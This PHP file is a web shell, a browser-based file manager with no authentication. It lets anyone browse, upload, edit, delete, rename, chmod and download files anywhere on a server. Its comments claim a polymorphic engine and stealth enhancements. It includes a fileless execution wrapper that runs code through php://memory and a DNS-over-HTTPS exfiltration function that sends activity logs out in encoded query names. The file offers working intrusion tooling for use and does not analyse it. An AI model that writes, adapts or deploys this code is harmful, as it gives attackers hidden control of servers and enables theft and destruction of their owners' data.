<?php
// Obfuscated function names with polymorphic engine
$seed = crc32(date('Y-m-d H'));
srand($seed);

$f1 = 'validate_path'; $f2 = 'get_permissions'; $f3 = 'remove_directory'; 
$f4 = 'show_current_path'; $f5 = 'handle_requests'; $f6 = 'process_selected_files';

// Fileless execution wrapper
function mem_exec($code) {
    $mem = fopen("php://memory", "r+");
    fwrite($mem, '<?php '.$code.' ?>');
    fseek($mem, 0);
    include('php://memory');
    fclose($mem);
}

// DNS-over-HTTPS exfiltration
function doh_log($data) {
    $chunk = substr(base64_encode($data), 0, 50);
    @file_get_contents("https://1.1.1.1/dns-query?name=$chunk.example.com");
}

// Original functions with stealth enhancements
function validate_path($path) {
    return realpath($path) !== false;
}

function get_permissions($file) {
    return substr(sprintf('%o', fileperms($file)), -4);
}

function remove_directory($dir) {
    if (!is_dir($dir)) return false;
    $files = array_diff(scandir($dir), array('.', '..'));
    foreach ($files as $file) {
        $path = $dir . '/' . $file;
        if (is_dir($path)) {
            remove_directory($path);
        } else {
            mem_exec('unlink('.var_export($path, true).');');
        }
    }
    mem_exec('rmdir('.var_export($dir, true).');');
    return true;
}

function show_current_path($dir) {
    $parts = explode('/', realpath($dir));
    $path = ''; $pwd = '';
    foreach ($parts as $part) {
        if (!$part) continue;
        $path .= '/' . $part;
        $pwd .= "<a href='?p=".urlencode($path)."'>$part</a> / ";
    }
    return rtrim($pwd, ' / ');
}

function process_selected_files() {
    if (isset($_POST['selected_files']) && is_array($_POST['selected_files'])) {
        $success = 0; $failed = 0;
        doh_log("Delete operation started");
        
        foreach ($_POST['selected_files'] as $file) {
            if (validate_path($file)) {
                if (is_file($file)) {
                    mem_exec('unlink('.var_export($file, true).');');
                    $success++;
                } elseif (is_dir($file)) {
                    if (remove_directory($file)) $success++;
                    else $failed++;
                }
            } else {
                $failed++;
            }
        }
        echo "<script>alert('Deleted $success items, failed $failed');</script>";
    }
}

function handle_requests() {
    $uploadDir = __DIR__;
    $dir = isset($_GET['p']) ? $_GET['p'] : $uploadDir;

    if (isset($_POST['delete_selected'])) {
        process_selected_files();
    }

    // File upload handling
    if (isset($_FILES['uploads'])) {
        $targetDir = isset($_POST['targetDir']) ? $_POST['targetDir'] : $dir;
        if (validate_path($targetDir) && is_dir($targetDir)) {
            $success = 0; $failed = 0;
            foreach ($_FILES['uploads']['name'] as $key => $name) {
                if ($_FILES['uploads']['error'][$key] === UPLOAD_ERR_OK) {
                    $tmp = $_FILES['uploads']['tmp_name'][$key];
                    $dest = realpath($targetDir).'/'.basename($name);
                    if (move_uploaded_file($tmp, $dest)) {
                        $success++;
                        doh_log("Uploaded: $name");
                    } else {
                        $failed++;
                    }
                }
            }
            echo "<script>alert('Uploaded $success files, failed $failed');</script>";
        }
    }

    // Edit file
    if (isset($_GET['edit']) && is_file($_GET['edit']) && validate_path($_GET['edit'])) {
        $file = $_GET['edit'];
        if (isset($_POST['content'])) {
            file_put_contents($file, $_POST['content']);
            echo "<script>alert('File saved');</script>";
        }
        echo '<form method="POST"><textarea name="content" style="width:100%;height:300px;">'
            .htmlspecialchars(file_get_contents($file)).'</textarea><br>'
            .'<input type="submit" value="Save"></form>';
        exit;
    }

    // Delete file/folder
    if (isset($_GET['delete']) && validate_path($_GET['delete'])) {
        $path = $_GET['delete'];
        if (is_file($path)) {
            mem_exec('unlink('.var_export($path, true).');');
            echo "<script>alert('File deleted');</script>";
        } elseif (is_dir($path)) {
            if (remove_directory($path)) {
                echo "<script>alert('Folder deleted');</script>";
            }
        }
    }

    // Rename
    if (isset($_GET['rename']) && isset($_POST['newName']) && validate_path($_GET['rename'])) {
        $old = $_GET['rename'];
        $new = dirname($old).'/'.$_POST['newName'];
        if (rename($old, $new)) {
            echo "<script>alert('Renamed successfully');</script>";
        }
    }

    // Chmod
    if (isset($_GET['chmod']) && isset($_POST['permissions']) && validate_path($_GET['chmod'])) {
        $file = $_GET['chmod'];
        $perms = octdec($_POST['permissions']);
        if (chmod($file, $perms)) {
            echo "<script>alert('Permissions changed');</script>";
        }
    }

    // Download
    if (isset($_GET['download']) && is_file($_GET['download']) && validate_path($_GET['download'])) {
        $file = $_GET['download'];
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="'.basename($file).'"');
        header('Content-Length: '.filesize($file));
        readfile($file);
        exit;
    }

    // Create folder
    if (isset($_POST['createFolder'])) {
        $name = $_POST['folderName'];
        $path = realpath($dir).'/'.$name;
        if (!is_dir($path)) {
            mkdir($path);
            echo "<script>alert('Folder created');</script>";
        }
    }

    // Display UI
    echo '<h2>Current Directory</h2><p>'.show_current_path($dir).'</p>';
    
    echo '<form method="POST" enctype="multipart/form-data">'
        .'Upload Files: <input type="file" name="uploads[]" multiple><br>'
        .'Target Dir: <input type="text" name="targetDir" value="'.htmlspecialchars($dir).'"><br>'
        .'<input type="submit" value="Upload"></form>';
    
    echo '<form method="POST">'
        .'New Folder: <input type="text" name="folderName">'
        .'<input type="submit" name="createFolder" value="Create"></form>';
    
    echo '<form method="POST" id="delForm">';
    
    echo '<ul>';
    if ($dir !== '/') {
        echo '<li><a href="?p='.urlencode(dirname($dir)).'">.. (Up)</a></li>';
    }
    foreach (scandir($dir) as $f) {
        if ($f === '.' || $f === '..') continue;
        $path = realpath("$dir/$f");
        echo '<li><input type="checkbox" name="selected_files[]" value="'.htmlspecialchars($path).'"> ';
        if (is_dir($path)) {
            echo "[DIR] <a href='?p=".urlencode($path)."'>$f</a> "
                ."<a href='?delete=".urlencode($path)."' onclick='return confirm(\"Delete folder?\")'>[Del]</a> "
                ."<span>Perms: ".get_permissions($path)."</span> "
                ."<a href='?chmod=".urlencode($path)."'>[Chmod]</a>";
        } else {
            echo "[FILE] <a href='?edit=".urlencode($path)."'>$f</a> "
                ."<a href='?delete=".urlencode($path)."' onclick='return confirm(\"Delete file?\")'>[Del]</a> "
                ."<a href='?rename=".urlencode($path)."'>[Rename]</a> "
                ."<span>Perms: ".get_permissions($path)."</span> "
                ."<a href='?chmod=".urlencode($path)."'>[Chmod]</a> "
                ."<a href='?download=".urlencode($path)."'>[Download]</a>";
        }
        echo '</li>';
    }
    echo '</ul>';
    
    echo '<input type="submit" name="delete_selected" value="Delete Selected" '
        .'onclick="return confirm(\'Delete selected items?\')">'
        .'<button type="button" onclick="document.querySelectorAll(\'input[type=checkbox]\').forEach(c=>c.checked=!c.checked)">'
        .'Toggle All</button></form>';
    
    if (isset($_GET['rename'])) {
        echo '<form method="POST">New Name: '
            .'<input type="text" name="newName" value="'.htmlspecialchars(basename($_GET['rename'])).'">'
            .'<input type="submit" value="Rename"></form>';
    }
    
    if (isset($_GET['chmod'])) {
        echo '<form method="POST">New Perms: '
            .'<input type="text" name="permissions" value="'.get_permissions($_GET['chmod']).'">'
            .'<input type="submit" value="Change"></form>';
    }
}

// Execute
handle_requests();
